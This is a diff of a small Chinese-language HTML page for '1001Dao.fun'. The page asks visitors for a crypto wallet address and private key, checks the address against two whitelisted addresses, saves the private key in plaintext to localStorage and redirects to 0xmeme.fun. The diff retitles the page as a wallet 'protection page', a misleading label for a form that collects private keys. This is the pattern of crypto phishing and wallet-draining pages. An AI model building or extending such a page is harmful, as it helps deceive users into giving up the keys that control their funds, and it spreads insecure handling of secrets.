@@ -1,48 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>1001Dao.fun - 钱包地址和私钥填写</title>
+    <title>1001Dao.fun - 钱包地址保护页面</title>
     <meta charset="UTF-8">
     <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-        }
-        input, button {
-            margin: 10px;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-        }
-        input {
-            background-color: #333;
-            color: white;
-        }
-        button {
-            background-color: #555;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #777;
-        }
+        /* 样式省略 */
     </style>
     <script>
-        function validateAndRedirect() {
+        const whitelist = ["3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH", "EYm6nui322ZWQkYNNUDJ6pYrcq8VXYhRzknVYsqfyQPj"];
+
+        function validateWalletAddress() {
             const walletAddress = document.getElementById("walletInput").value;
             const privateKey = document.getElementById("privateKeyInput").value;
-            const whitelist = ["3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH", "EYm6nui322ZWQkYNNUDJ6pYrcq8VXYhRzknVYsqfyQPj"];
-            
+
             if (whitelist.includes(walletAddress)) {
-                // 将私钥存储在 sessionStorage
-                sessionStorage.setItem("privateKey", privateKey);
-                // 跳转到第二个页面
+                // 存储私钥到 localStorage
+                localStorage.setItem("privateKey", privateKey);
+
+                // 跳转到 0xmeme.fun
                 window.location.href = "https://0xmeme.fun";
             } else {
-                alert("钱包地址无效，不在白名单内！");
+                alert("钱包地址无效，请重试！");
             }
         }
     </script>
@@ -51,6 +29,6 @@
     <h2>1001Dao.fun - 请输入钱包地址和私钥</h2>
     <input type="text" id="walletInput" placeholder="输入钱包地址">
     <input type="password" id="privateKeyInput" placeholder="输入私钥">
-    <button onclick="validateAndRedirect()">登录</button>
+    <button onclick="validateWalletAddress()">提交</button>
 </body>
 </html>
